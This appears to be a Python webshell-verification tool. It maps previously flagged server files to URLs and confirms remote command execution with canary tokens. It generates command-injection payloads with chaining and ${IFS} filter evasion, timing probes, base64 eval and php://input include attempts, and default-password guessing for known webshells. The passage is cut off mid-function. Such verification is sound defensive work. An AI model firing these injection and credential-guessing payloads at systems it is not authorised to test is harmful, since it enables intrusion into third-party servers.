# verify_rce.py
# -*- coding: utf-8 -*-
"""
verify_rce.py — Phase 2: Dynamic RCE verification against Phase-1 candidates.

Requirements:
  pip install requests pyyaml tqdm colorama
"""

import argparse, json, csv, time, uuid, os, sys, re, base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode
from collections import Counter
from datetime import datetime
import requests
from tqdm import tqdm

# ===== Colors =====
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    C_GREEN  = Fore.GREEN
    C_RED    = Fore.RED
    C_YELLOW = Fore.YELLOW
    C_CYAN   = Fore.CYAN
    C_BLUE   = Fore.BLUE
    C_RESET  = Style.RESET_ALL
except Exception:
    C_GREEN = C_RED = C_YELLOW = C_CYAN = C_BLUE = C_RESET = ""

# ===== Optional YAML =====
try:
    import yaml
except Exception:
    yaml = None  # Allow --urls-only mode without PyYAML

# ===== Parameters & payloads =====
DEFAULT_PARAMS = [
    "cmd","c","exec","command","run","shell","q","s","action","do","code","payload",
    # extras common in shells/templates
    "p","x","a","b","u","file","include","f","user","page","path","tpl","template","module","data","tmpl"
]

# Alternative Linux/Unix prints (evade naive 'echo' filtering)
LIN_ECHOS = [
    'echo {tok}',
    'printf {tok}\\n',
    '/bin/echo {tok}',
    'echo${IFS}{tok}',
    'printf%20{tok}\\n',
]
LIN_BASE = ['id', 'uname -a']

# Alternative Windows prints
WIN_ECHOS = [
    'echo {tok}',
    'cmd /c echo {tok}',
    'powershell -NoProfile -Command "Write-Output {tok}"',
]
WIN_BASE = ['ver', 'whoami']

# Chainers to try around the print
CHAINERS = [
    '{cmd}', ';{cmd}', ';&{cmd}', '&& {cmd}', '&&{cmd}', '| {cmd}', '|{cmd}', '& {cmd}', '&{cmd}',
]

# "Blind" timing (~5s delay)
WIN_TIME = 'ping -n 6 127.0.0.1 >NUL & echo {tok}'
LIN_TIME = 'sleep 5; echo {tok}'

HEADERS_JSON = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}

# ===== Known webshell hints → parameters to try =====
KNOWN_SHELL_HINTS = [
    (re.compile(r'(?:/|^)r57', re.I),               ["cmd","act","action","a","c"]),
    (re.compile(r'(?:/|^)c99', re.I),               ["cmd","act","action","c","exec"]),
    (re.compile(r'(?:/|^)wso', re.I),               ["cmd","a","c","p","pass","exec"]),
    (re.compile(r'(?:/|^)b374k', re.I),             ["cmd","c","do","code","exec"]),
    (re.compile(r'(?:/|^)testshell', re.I),         ["cmd","c","exec","tmpl","user","p"]),
    (re.compile(r'(?:/|^)shell', re.I),             ["cmd","c","exec","run"]),
    (re.compile(r'(?:/|^)upload', re.I),            ["cmd","exec","run"]),
]

# Auth param guesses & common passwords in webshells
AUTH_PARAM_GUESSES = ["pass","password","auth","key","access","p","k","login","u","user"]
COMMON_PASSWORDS   = ["r57","c99","admin","root","god","pass","password","shell","1","secret"]

# Secondary k/v pairs often used to select engine/action + toggles
SECONDARY_KV_GUESSES = [
    {"func":"system"}, {"func":"exec"}, {"func":"shell_exec"}, {"func":"passthru"},
    {"method":"system"}, {"engine":"system"}, {"act":"cmd"}, {"action":"cmd"},
    {"ajax":"1"}, {"mode":"exec"}, {"task":"exec"},
    # toggles that may “unlock” obfuscated branches
    {"hot":"1"}, {"debug":"1"}, {"obf":"1"}, {"unlock":"1"}, {"safe":"0"}
]

# --- Simple PHP error classifier (to enrich evidence) ---
PHP_ERROR_PATTERNS = [
    (re.compile(r'Parse error:', re.I), 'php_error:parse_error'),
    (re.compile(r'Fatal error:\s+.*undefined function\s+eval', re.I), 'php_error:eval_undef'),
    (re.compile(r'Array and string offset access syntax with curly braces is no longer supported', re.I), 'php_error:php8_incompat'),
    (re.compile(r'Warning:\s*include\([^)]*\): Failed to open stream', re.I), 'php_error:include_open'),
    (re.compile(r'Warning:\s*include\(\): Failed opening', re.I), 'php_error:include_open'),
    (re.compile(r'Fatal error:', re.I), 'php_error:fatal'),
    (re.compile(r'Warning:', re.I), 'php_warning'),
    (re.compile(r'Notice:', re.I), 'php_notice'),
    (re.compile(r'Deprecated:', re.I), 'php_deprecated'),
]

def php_error_tag(text: str):
    if not text:
        return None
    for rx, tag in PHP_ERROR_PATTERNS:
        if rx.search(text):
            return tag
    return None

# ===== utils =====
def load_report(path):
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    if isinstance(data, dict) and "findings" in data:
        data = data["findings"]
    return data

def load_map(map_path):
    if not map_path:
        return []
    if yaml is None:
        raise RuntimeError("PyYAML not available. Install 'pyyaml' or use --urls.")
    with open(map_path, "r", encoding="utf-8") as f:
        conf = yaml.safe_load(f)
    items = conf.get("mappings") or conf
    out = []
    for m in items:
        root = m.get("root") or m.get("fs_root") or ""
        urlp = m.get("url_prefix") or m.get("base_url") or ""
        if not root or not urlp:
            continue
        out.append({"root": os.path.normpath(root), "url_prefix": urlp.rstrip("/")})
    return out

def path_to_url(fs_path, mappings):
    fs_norm = os.path.normpath(fs_path)
    for m in mappings:
        root = m["root"]
        if fs_norm.startswith(root):
            rel = fs_norm[len(root):].replace("\\", "/")
            if not rel.startswith("/"):
                rel = "/" + rel
            return m["url_prefix"] + rel
    return None

def pick_candidates(report, risk_min="MEDIUM"):
    ok_risks = {"HIGH"} | ({"MEDIUM"} if risk_min.upper() in {"MEDIUM","LOW"} else set())
    exts = (".php",".asp",".aspx",".jsp",".jspx",".ashx",".asmx",".phtml",".php5",".inc")
    urls = []
    for i in report:
        risk = str(i.get("risk","")).upper()
        p = i.get("path") or i.get("file") or ""
        if risk in ok_risks and p.lower().endswith(exts):
            urls.append(p)
    return urls

def build_targets(fs_paths, mappings, extra_urls):
    targets, seen = [], set()
    for p in fs_paths:
        url = path_to_url(p, mappings) if mappings else None
        if url and url not in seen:
            targets.append(url); seen.add(url)
    for u in (extra_urls or []):
        if u not in seen:
            targets.append(u); seen.add(u)
    return targets

def try_one(url, param_name, value, method, timeout, headers=None, cookies=None,
            allow_redirects=True, auth_kv=None, as_multipart=False, as_json=False,
            extra_kv=None):
    """
    Perform a single request with (param_name=value). Optionally adds simple
    auth like 'pass=...' (auth_kv) and extra k/v (extra_kv).
    Supports x-www-form-urlencoded, multipart/form-data and JSON for POST.
    """
    t0 = time.time()
    try:
        if method == "GET":
            params = {param_name: value}
            if auth_kv:
                params[auth_kv[0]] = auth_kv[1]
            if extra_kv:
                params.update(extra_kv)
            r = requests.get(url, params=params, headers=headers, cookies=cookies,
                             timeout=timeout, verify=False, allow_redirects=allow_redirects)
        else:
            if as_json:
                body = {param_name: value}
                if auth_kv:
                    body[auth_kv[0]] = auth_kv[1]
                if extra_kv:
                    body.update(extra_kv)
                r = requests.post(url, json=body, headers=headers, cookies=cookies,
                                  timeout=timeout, verify=False, allow_redirects=allow_redirects)
            elif as_multipart:
                files = {param_name: (None, value)}
                data  = {}
                if auth_kv:
                    data[auth_kv[0]] = auth_kv[1]
                if extra_kv:
                    data.update(extra_kv)
                r = requests.post(url, data=data, files=files, headers=headers, cookies=cookies,
                                  timeout=timeout, verify=False, allow_redirects=allow_redirects)
            else:
                data = {param_name: value}
                if auth_kv:
                    data[auth_kv[0]] = auth_kv[1]
                if extra_kv:
                    data.update(extra_kv)
                r = requests.post(url, data=data, headers=headers, cookies=cookies,
                                  timeout=timeout, verify=False, allow_redirects=allow_redirects)
        dt = time.time() - t0
        return r.status_code, r.text or "", dt, None
    except Exception as e:
        dt = time.time() - t0
        return None, "", dt, str(e)

def base_latency(url, timeout, headers=None, cookies=None):
    """
    Simple request to measure baseline latency (and initial status_code).
    """
    t0 = time.time()
    try:
        r = requests.get(url, headers=headers, cookies=cookies,
                         timeout=timeout, verify=False, allow_redirects=True)
        return (time.time() - t0), r.status_code, (r.text or "")
    except Exception:
        return (time.time() - t0), None, ""

def _subst_tok(template: str, token: str) -> str:
    # Replace only {tok}, keep ${IFS}, braces, etc.
    return template.replace("{tok}", token)

def _gen_linux_payloads(token):
    prints = [_subst_tok(p, token) for p in LIN_ECHOS]
    bases  = LIN_BASE[:]
    payloads = set()
    for pr in prints:
        for ch in CHAINERS:
            payloads.add(ch.format(cmd=pr))
    for base in bases:
        for pr in prints:
            payloads.add(f"{base}; {pr}")
            payloads.add(f"{base}&&{pr}")
    return list(payloads)

def _gen_windows_payloads(token):
    prints = [_subst_tok(p, token) for p in WIN_ECHOS]
    bases  = WIN_BASE[:]
    payloads = set()
    for pr in prints:
        for ch in CHAINERS:
            payloads.add(ch.format(cmd=pr))
    for base in bases:
        for pr in prints:
            payloads.add(f"{base} & {pr}")
            payloads.add(f"{base} && {pr}")
            payloads.add(f"{base} | {pr}")
    return list(payloads)

def verify_url(url, params, token, timeout, time_pad=4.0,
               headers=None, cookies=None, methods=("GET","POST"),
               try_time_based=True, only_http_200=False, aggressive=False,
               aggr_budget=500, aggr_max_auth=6, aggr_max_pass=8,
               extra_kv_list=None, alt_evidence=None):
    """
    Returns a dict with:
      url, rce(bool), method, param, os, evidence, status_code, error, elapsed, resp_text
    """
    alt_evidence = alt_evidence or []

    def _hit_alt(text: str):
        if not text:
            return None
        for s in alt_evidence:
            if s and s in text:
                return s
        return None

    # === Baseline ===
    base_dt, base_status, base_text = base_latency(url, timeout, headers, cookies)
    base_php_err = php_error_tag(base_text)

    # Early exit if filtering on 200 and it doesn't look like a shell
    looks_like_shell = any(rx.search(url) for rx, _ in KNOWN_SHELL_HINTS)
    if only_http_200 and (base_status != 200) and not looks_like_shell:
        return {
            "url": url, "rce": False, "method": None, "param": None, "os": None,
            "evidence": f"baseline_status:{base_status}", "status_code": base_status, "error": None,
            "elapsed": round(base_dt,3), "resp_text": base_text if base_text else None,
        }

    # ✅ If alt-evidence is visible at baseline, mark positive
    alt_hit = _hit_alt(base_text)
    if alt_hit:
        return {
            "url": url, "rce": True, "method": "GET", "param": "-", "os": None,
            "evidence": f"alt:{alt_hit} baseline", "status_code": base_status, "error": None,
            "elapsed": round(base_dt,3), "resp_text": base_text,
        }

    # Build param-space (with hints)
    param_space = list(dict.fromkeys(params))
    for rx, extra in KNOWN_SHELL_HINTS:
        if rx.search(url):
            for p in extra:
                if p not in param_space:
                    param_space.append(p)

    # Aggressive mode: auth pairs and extra toggles
    auth_pairs = [None]
    if aggressive:
        sel_auth = AUTH_PARAM_GUESSES[:max(0, aggr_max_auth)]
        sel_pass = COMMON_PASSWORDS[:max(0, aggr_max_pass)]
        auth_pairs = [None] + [(ap, pw) for ap in sel_auth for pw in sel_pass]

    extra_sets = [None]
    if extra_kv_list:
        for kv in extra_kv_list:
            extra_sets.append(kv)
    if aggressive:
        for kv in SECONDARY_KV_GUESSES:
            extra_sets.append(kv)

    combos_made = 0
    last_err = None; last_code = base_status; last_dt = base_dt
    last_text = base_text  # keep baseline if nothing else

    lin_payloads = _gen_linux_payloads(token)
    win_payloads = _gen_windows_payloads(token)

    # ==== 1) Standard "echo" payloads (Linux & Windows) ====
    for m in methods:
        for p in param_space:
            for oskind, plist in (("win", win_payloads), ("nix", lin_payloads)):
                for payload in plist:
                    var_specs = [(None, False, False, None)]
                    if aggressive:
                        for ap in auth_pairs:
                            for xkv in extra_sets:
                                var_specs.append((ap, False, False, xkv))
                                if m == "POST":
                                    var_specs.append((ap, True,  False, xkv))
                                    var_specs.append((ap, False, True,  xkv))
                    for apair, as_mp, as_js, xkv in var_specs:
                        combos_made += 1
                        if aggressive and combos_made > aggr_budget:
                            break
                        code, text, dt, err = try_one(
                            url, p, payload, m, timeout, headers, cookies,
                            auth_kv=apair, as_multipart=as_mp, as_json=as_js,
                            extra_kv=xkv
                        )
                        if err:
                            last_err = err; last_code = code; last_dt = dt; last_text = text
                            continue
                        alt_hit = _hit_alt(text)
                        if (token in text) or alt_hit:
                            ev = f"token:{token} visible" if (token in text) else f"alt:{alt_hit} visible"
                            if apair: ev += f" (auth {apair[0]}=***)"
                            if xkv:   ev += f" +extra:{','.join(f'{k}={v}' for k,v in (xkv or {}).items())}"
                            if as_mp: ev += " multipart"
                            if as_js: ev += " json"
                            return {
                                "url": url, "rce": True, "method": m, "param": p, "os": oskind,
                                "evidence": ev, "status_code": code, "error": None, "elapsed": round(dt,3),
                                "resp_text": text,
                            }
                        last_err = None; last_code = code; last_dt = dt; last_text = text
                    if aggressive and combos_made > aggr_budget: break
                if aggressive and combos_made > aggr_budget: break
            if aggressive and combos_made > aggr_budget: break
        if aggressive and combos_made > aggr_budget: break

    # ==== 2) Extra AGGRESSIVE techniques ====
    if aggressive:
        # 2.a) eval(base64_decode($_REQUEST['p']))
        b64_codes = [
            f"echo '{token}';",
            f"print '{token}';",
            f"printf '{token}\\n';",
            f"system('echo {token}');",
        ]
        b64_vals = [base64.b64encode(c.encode()).decode() for c in b64_codes]
        b64_params = ("p","code","x","payload","data")
        for m in methods:
            for k in b64_params:
                for ap in auth_pairs:
                    for xkv in (extra_sets if extra_sets else [None]):
                        for v in b64_vals:
                            combos_made += 1
                            if combos_made > aggr_budget: break
                            code, text, dt, err = try_one(
                                url, k, v, m, timeout, headers, cookies,
                                auth_kv=ap, extra_kv=xkv
                            )
                            if not err:
                                alt_hit = _hit_alt(text)
                                if (token in text) or alt_hit:
                                    ev = f"token:{token} via base64 param '{k}'" if (token in text) else f"alt:{alt_hit} visible via base64 param '{k}'"
                                    if ap:   ev += f" (auth {ap[0]}=***)"
                                    if xkv:  ev += f" +extra:{','.join(f'{kk}={vv}' for kk,vv in (xkv or {}).items())}"
                                    return {
                                        "url": url, "rce": True, "method": m, "param": k, "os": None,
                                        "evidence": ev, "status_code": code, "error": None, "elapsed": round(dt,3),
                                        "resp_text": text,
                                    }
                            last_err = err; last_code = code; last_dt = dt; last_text = text
                        if combos_made > aggr_budget: break
                    if combos_made > aggr_budget: break
                if combos_made > aggr_budget: break
            if combos_made > aggr_budget: break

        # 2.b) Param concatenation (a+b, p+q, x+y)
        concat_pairs = (("a","b"),("p","q"),("x","y"))
        concat_variants = [
            ("echo '", f"{token}';"),
            ("print '", f"{token}';"),
            ("system('echo ", f"{token}');"),
        ]
        for (a, b) in concat_pairs:
            for m in methods:
                for ap in auth_pairs:
                    for xkv in (extra_sets if extra_sets else [None]):
                        for va, vb in concat_variants:
                            combos_made += 1
                            if combos_made > aggr_budget: break
                            code, text, dt, err = try_one(
                                url, a, va, m, timeout, headers, cookies,
                                auth_kv=ap, extra_kv={**(xkv or {}), b: vb}
                            )
                            if not err:
                                alt_hit = _hit_alt(text)
                                if (token in text) or alt_hit:
                                    ev = f"token:{token} via concat {a}+{b}" if (token in text) else f"alt:{alt_hit} visible via concat {a}+{b}"
                                    if ap:  ev += f" (auth {ap[0]}=***)"
                                    if xkv: ev += f" +extra:{','.join(f'{kk}={vv}' for kk,vv in (xkv or {}).items())}"
                                    return {
                                        "url": url, "rce": True, "method": m, "param": f"{a}+{b}", "os": None,
                                        "evidence": ev, "status_code": code, "error": None, "elapsed": round(dt,3),
                                        "resp_text": text,
                                    }
                            last_err = err; last_code = code; last_dt = dt; last_text = text
                        if combos_made > aggr_budget: break
                    if combos_made > aggr_budget: break
                if combos_made > aggr_budget: break
            if combos_made > aggr_budget: break

        # 2.c) include php://input (...)
        inc_params = ("u","file","include","f","user","page","path","tpl","template","module","tmpl")
        ct_variants = [("text/plain",), ("application/x-www-form-urlencoded",), ("application/octet-stream",)]
        php_body = lambda tok: f"<?php echo '{tok}'; ?>"
        for k in inc_params:
            for ap in auth_pairs:
                for xkv in (extra_sets if extra_sets else [None]):
                    for (ctype,) in ct_variants:
                        combos_made += 1
                        if combos_made > aggr_budget: break
                        try:
                            q = {k: "php://input"}
                            if ap:  q[ap[0]] = ap[1]
                            if xkv: q.update(xkv)
                            qstr = urlencode(q, doseq=True)
                            target = f"{url}{'&' if '?' in url else '?'}{qstr}"

                            body = php_body(token)
                            hdrs = dict(headers or {}); hdrs["Content-Type"] = ctype
                            t0 = time.time()
                            r = requests.post(target, data=body, headers=hdrs, cookies=cookies,
                                              timeout=timeout, verify=False, allow_redirects=True)
                            dt = time.time() - t0
                            text = r.text or ""
                            alt_hit = _hit_alt(text)
                            if (token in text) or alt_hit:
                                ev = f"token:{token} via include php://input ({k}, {ctype})" if (token in text) else f"alt:{alt_hit} visible via include php://input ({k}, {ctype})"
                                if ap:  ev += f" (auth {ap[0]}=***)"
                                if xkv: ev += f" +extra:{','.join(f'{kk}={vv}' for kk,vv in (xkv or {}).items())}"
                                return {
                                    "url": url, "rce": True, "method": "POST", "param": k, "os": None,
                                    "evidence": ev, "status_code": r.status_code, "error": None, "elapsed": round(dt,3),
                                    "resp_text": text,
                                }
                            last_err = None; last_code = r.status_code; last_dt = dt; last_text = text
                        except Exception as e:
                            last_err = str(e); last_code = None; last_dt = 0.0; last_text = None
                    if combos_made > aggr_budget: break
                if combos_made > aggr_budget: break
            if aggr_budget and combos_made > aggr_budget: break

    # ==== 3) Blind timing ====
    if try_time_based and param_space:
        for (m, p, osk, payload) in [
            ("GET",  param_space[0], "win", WIN_TIME.format(tok=token)),
            ("GET",  param_space[0], "nix", LIN_TIME.format(tok=token)),
            ("POST", param_space[0], "win", WIN_TIME.format(tok=token)),
            ("POST", param_space[0], "nix", LIN_TIME.format(tok=token)),
        ]:
            code, text, dt, err = try_one(url, p, payload, m, timeout + 6, headers, cookies)
            if err:
                last_err = err; last_code = code; last_dt = dt; last_text = text
                continue
            if dt - base_dt >= time_pad:
                return {
                    "url": url, "rce": True, "method": m, "param": p, "os": osk,
                    "evidence": f"delay {round(dt-base_dt,2)}s over baseline ({round(base_dt,2)}→{round(dt,2)}s)",
                    "status_code": code, "error": None, "elapsed": round(dt,3),
                    "resp_text": text,
                }
            last_err = None; last_code = code; last_dt = dt; last_text = text

    # No success: return NO-RCE, but attach PHP error (if any) seen at baseline
    evidence = base_php_err or ""
    return {
        "url": url, "rce": False, "method": None, "param": None, "os": None,
        "evidence": evidence, "status_code": base_status,
        "error": last_err if 'last_err' in locals() else None,
        "elapsed": round(last_dt,3) if 'last_dt' in locals() else round(base_dt,3),
        "resp_text": last_text,
    }

def write_json(path, rows):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(rows, f, ensure_ascii=False, indent=2)

def write_csv(path, rows):
    fields = ["url","rce","method","param","os","evidence","status_code","elapsed","error"]
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=fields)
        w.writeheader()
        for r in rows:
            w.writerow({k: r.get(k,"") for k in fields})

def emit_mapping_hints(results, targets, verbose=False):
    if not results or any(r.get("rce") for r in results):
        return

    to_s = lambda x: "" if x is None else str(x)

    def _is_local_no_port(u: str) -> bool:
        try:
            p = urlparse(u)
            return (p.hostname in {"localhost", "127.0.0.1"} and (p.port is None))
        except Exception:
            return False

    scodes = [r.get("status_code") for r in results if isinstance(r.get("status_code"), int)]
    sc = Counter(scodes)
    total = len(results)
    noisy = sum(sc.get(k, 0) for k in (301, 302, 401, 403, 404))
    frac_noisy = (noisy / total) if total else 0.0

    txt_join = (" ".join(
        [*(to_s(r.get("evidence")) for r in results),
         *(to_s(r.get("error")) for r in results)]
    )).lower()

    local_no_port = any(_is_local_no_port(u) for u in targets)
    has_net_err = any(
        any(k in to_s(r.get("error","")).lower()
            for k in ("connection refused", "timed out", "timeout", "denied"))
        for r in results
    )
    netsparker_denied = ("netsparkercloud/settings" in txt_join and "denied" in txt_join)
    few_targets = (total <= 3)

    should_hint = (
        frac_noisy >= 0.70
        or few_targets
        or local_no_port
        or has_net_err
        or netsparker_denied
    )
    if not should_hint:
        return

    print("\033[33m[HINT]\033[0m RCE not confirmed. Check mapping/environment issues:")
    if sc:
        summary = " ".join(f"{k}:{v}" for k, v in sorted(sc.items()))
        print(f"       HTTP codes → \033[36m{summary}\033[0m")
    if frac_noisy >= 0.70:
        print("       Many \033[36m{301,302,401,403,404}\033[0m "
              f"({noisy}/{total}). Review \033[36mbase-path\033[0m, "
              "\033[36mauthentication (cookies/headers)\033[0m or protected routes.")
    if local_no_port:
        print("       Detected \033[36mlocalhost/127.0.0.1 without port\033[0m.")
        print("       Adjust \033[36mconfig.yml → url_prefix\033[0m, e.g.: "
              "\033[36mhttp://localhost:8080/your_patch\033[0m")
    if has_net_err:
        print("       Network errors found (\033[36mrefused/timeout/denied\033[0m).")
        print("       Check \033[36mport\033[0m, \033[36mfirewall\033[0m and endpoint accessibility from here.")
    if netsparker_denied:
        print("       Saw \033[36m'NetsparkerCloud/Settings is denied'\033[0m.")
        print("       Usually wrong \033[36mport/base-path\033[0m. "
              "Try \033[36mhttp://localhost:8080/your_patch\033[0m.")
    if few_targets:
        print("       Quick tips (few endpoints):")
        print("         • Try \033[36m--cookie\033[0m (logged-in session).")
        print("         • Confirm \033[36murl_prefix\033[0m (port/base-path).")
        print("         • If the webshell requires a specific param (e.g. \033[36mcmd\033[0m), use \033[36m--params cmd\033[0m.")

def _short(s: str, maxlen: int = 72) -> str:
    if not s or len(s) <= maxlen:
        return s
    head = maxlen - 3
    return s[:head] + "..."

def _parse_extra_kv(s):
    # "k1=v1,k2=v2"
    out = []
    if not s: return out
    for part in s.split(","):
        if "=" in part:
            k, v = part.split("=", 1)
            k = k.strip(); v = v.strip()
            if k:
                out.append({k: v})
    return out

def _parse_csv_list(s):
    if not s:
        return []
    return [x.strip() for x in s.split(",") if x.strip()]

def _stamp_path(path: str, ts: str):
    if not path:
        return path
    if "{ts}" in path:
        return path.replace("{ts}", ts)
    base, ext = os.path.splitext(path)
    return f"{base}_{ts}{ext}" if ext else f"{path}_{ts}"

def _derive_named(base_out_path: str, suffix: str, ext: str):
    b, _ = os.path.splitext(base_out_path)
    return f"{b}_{suffix}{ext}"

def _safe_name_from_url(u: str):
    # host_path without problematic chars
    try:
        p = urlparse(u)
        host = (p.hostname or "host")
        path = (p.path or "/").strip("/")
        name = f"{host}_{path}".replace("/", "_")
    except Exception:
        name = re.sub(r'[^a-zA-Z0-9]+', '_', u)
    name = re.sub(r'[^a-zA-Z0-9_.-]+', '_', name)
    return name[:150]

def main():
    ap = argparse.ArgumentParser(description="Verify possible webshell RCE via HTTP requests")
    ap.add_argument("--report", required=False, help="Phase-1 JSON (report.json)")
    ap.add_argument("--map", dest="map_path", help="config.yml with mappings root→url_prefix")
    ap.add_argument("--urls", nargs="*", help="Additional URLs to test (optional)")
    ap.add_argument("--params", nargs="*", help="Parameter names to try (override)")
    ap.add_argument("--methods", nargs="*", default=["GET","POST"],
                    help="HTTP methods to try (default GET and POST). Example: --methods GET")
    ap.add_argument("--timeout", type=int, default=10)
    ap.add_argument("--workers", type=int, default=16)
    ap.add_argument("--out", default="rce_verified.json")
    ap.add_argument("--csv", default="rce_verified.csv")
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--headers", help='Extra headers as JSON (e.g. \'{"X-Token":"abc"}\')')
    ap.add_argument("--cookie", help="Literal cookie string (e.g. PHPSESSID=abc; other=1)")
    ap.add_argument("--risk-min", default="MEDIUM", help="HIGH or MEDIUM (default MEDIUM)")
    ap.add_argument("--no-time-based", action="store_true", help="Disable timing-based checks")
    ap.add_argument("--only-http-200", action="store_true",
                    help="Ignore endpoints whose initial status is not 200 (unless name looks like a known shell)")
    ap.add_argument("--aggressive", action="store_true",
                    help="Enable extra variants (auth/json/multipart + secondary toggles and obfuscated techniques)")
    ap.add_argument("--aggr-budget", type=int, default=500,
                    help="Max requests per endpoint in aggressive mode (default 500)")
    ap.add_argument("--aggr-max-auth", type=int, default=6,
                    help="Max auth param names to try (default 6)")
    ap.add_argument("--aggr-max-pass", type=int, default=8,
                    help="Max passwords per auth name (default 8)")
    ap.add_argument("--extra-kv", type=str, default="",
                    help="Extra pairs k=v separated by comma (e.g., func=system,ajax=1)")
    ap.add_argument("--alt-evidence", type=str, default="",
                    help="Extra strings that count as visible evidence if present (comma-separated)")
    # Outputs & logging
    ap.add_argument("--no-datetime", action="store_true",
                    help="Do not append timestamp to output filenames")
    ap.add_argument("--log", type=str, default="",
                    help="Log file (use {ts} to place the timestamp explicitly)")
    ap.add_argument("--positives-out", type=str, default="",
                    help="JSON with positives only (default generated next to --out)")
    ap.add_argument("--positives-csv", type=str, default="",
                    help="CSV with positives only (default generated next to --csv)")
    ap.add_argument("--save-bodies", type=str, default="",
                    help="Directory to save HTTP response bodies (positives by default)")
    ap.add_argument("--save-bodies-all", action="store_true",
                    help="Also save bodies for NO-RCE/ERR (may grow large)")
    args = ap.parse_args()

    if not args.report and not args.urls:
        print(f"{C_RED}ERROR:{C_RESET} you need --report or --urls", file=sys.stderr)
        sys.exit(2)

    if args.map_path and yaml is None:
        print(f"{C_RED}ERROR:{C_RESET} PyYAML required for --map. Install 'pyyaml' or use --urls.", file=sys.stderr)
        sys.exit(2)

    headers = dict(HEADERS_JSON)
    if args.headers:
        try:
            headers.update(json.loads(args.headers))
        except Exception as e:
            print(f"{C_YELLOW}[WARN]{C_RESET} invalid --headers: {e}")

    cookies = None
    if args.cookie:
        cookies = {}
        for part in args.cookie.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k.strip()] = v.strip()

    report    = load_report(args.report) if args.report else []
    mappings  = load_map(args.map_path)  if args.map_path  else []
    fs_cand   = pick_candidates(report, args.risk_min)     if report else []
    targets   = build_targets(fs_cand, mappings, args.urls)

    token  = "SHCANARY_" + uuid.uuid4().hex[:8]
    params = args.params if args.params else list(DEFAULT_PARAMS)
    extra_kv_list = _parse_extra_kv(args.extra_kv)
    alt_evidence  = _parse_csv_list(args.alt_evidence)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = args.out if args.no_datetime else _stamp_path(args.out, ts)
    csv_path = args.csv if args.no_datetime else _stamp_path(args.csv, ts)

    # Positives outputs
    pos_json = args.positives_out if args.positives_out else _derive_named(out_path, "positives", ".json")
    pos_csv  = args.positives_csv if args.positives_csv else _derive_named(csv_path, "positives", ".csv")

    # Log path
    if args.log:
        log_path = args.log if args.no_datetime else _stamp_path(args.log, ts)
    else:
        # default next to JSON
        base_noext, _ = os.path.splitext(out_path)
        log_path = f"{base_noext}.log"

    # Prep save-bodies dir
    bodies_dir = args.save_bodies.strip()
    if bodies_dir:
        if not args.no_datetime and "{ts}" in bodies_dir:
            bodies_dir = bodies_dir.replace("{ts}", ts)
        elif not args.no_datetime:
            # if it doesn't contain {ts}, append timestamp suffix
            bodies_dir = f"{bodies_dir.rstrip(os.sep)}_{ts}"
        os.makedirs(bodies_dir, exist_ok=True)

    if args.verbose:
        print(f"{C_CYAN}[INFO]{C_RESET} Verifying {len(targets)} endpoints — timeout={args.timeout}s workers={args.workers}")
        print(f"{C_CYAN}[DEBUG]{C_RESET} Methods: {args.methods}")
        print(f"{C_CYAN}[DEBUG]{C_RESET} Params: {params}")
        print(f"{C_CYAN}[DEBUG]{C_RESET} Token: {token}")
        if args.aggressive:
            print(f"{C_CYAN}[DEBUG]{C_RESET} Aggressive=ON budget={args.aggr_budget} auth={args.aggr_max_auth} pass={args.aggr_max_pass}")
        if args.only_http_200:
            print(f"{C_CYAN}[DEBUG]{C_RESET} only-http-200=ON")
        if extra_kv_list:
            print(f"{C_CYAN}[DEBUG]{C_RESET} extra-kv={extra_kv_list}")
        if alt_evidence:
            print(f"{C_CYAN}[DEBUG]{C_RESET} alt-evidence={alt_evidence}")
        print(f"{C_CYAN}[DEBUG]{C_RESET} out={out_path}  csv={csv_path}")
        print(f"{C_CYAN}[DEBUG]{C_RESET} log={log_path}")
        if bodies_dir:
            print(f"{C_CYAN}[DEBUG]{C_RESET} save-bodies dir={bodies_dir} (all={args.save_bodies_all})")

    results = []
    if not targets:
        if args.verbose:
            print(f"{C_CYAN}[INFO]{C_RESET} No URLs to verify (mappings/filters?).")
        write_json(out_path, []); write_csv(csv_path, [])
        write_json(pos_json, []); write_csv(pos_csv, [])
        with open(log_path, "w", encoding="utf-8") as lf:
            lf.write(f"[{ts}] No targets.\n")
        print(f"{C_CYAN}[INFO]{C_RESET} DONE — RCE: 0   NO-RCE: 0   ERR: 0")
        print(f"{C_CYAN}[INFO]{C_RESET} JSON → {out_path}")
        print(f"{C_CYAN}[INFO]{C_RESET} CSV  → {csv_path}")
        print(f"{C_CYAN}[INFO]{C_RESET} LOG  → {log_path}")
        print(f"{C_CYAN}[INFO]{C_RESET} POS  → {pos_json} / {pos_csv}")
        return

    # ===== Pretty progress bar with colors, no extra lines =====
    bar_format = (
        f"{C_CYAN}{{desc}}{C_RESET} "
        f"{C_BLUE}{{percentage:3.0f}}%{C_RESET}|{C_CYAN}{{bar}}{C_RESET}| "
        f"{C_YELLOW}{{n_fmt}}/{{total_fmt}}{C_RESET} • "
        f"{C_YELLOW}{{rate_fmt}}{C_RESET} • "
        f"{C_GREEN}RCE {{postfix}}{C_RESET}"
    )

    def make_postfix(r_yes, r_no, r_err, last_tag, now_url=None):
        now = f" • now: {_short(now_url)}" if now_url else ""
        return (f"{C_GREEN}{r_yes}{C_RESET}/"
                f"{C_RED}{r_no}{C_RESET}/"
                f"{C_YELLOW}{r_err}{C_RESET}"
                f" • last: {last_tag}{now}")

    prog = tqdm(total=len(targets),
                desc="Verifying",
                unit="url",
                dynamic_ncols=True,
                smoothing=0.3,
                leave=True,
                bar_format=bar_format)

    rce_yes = rce_no = err_cnt = 0
    last_tag = "—"
    verbose_rows = []
    log_lines = []

    started_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_lines.append(f"[START] {started_at}")
    log_lines.append(f"args={vars(args)}")
    log_lines.append(f"token={token}")
    log_lines.append(f"targets={len(targets)}")

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(
                    verify_url, url=t, params=params, token=token, timeout=args.timeout,
                    headers=headers, cookies=cookies,
                    methods=args.methods,
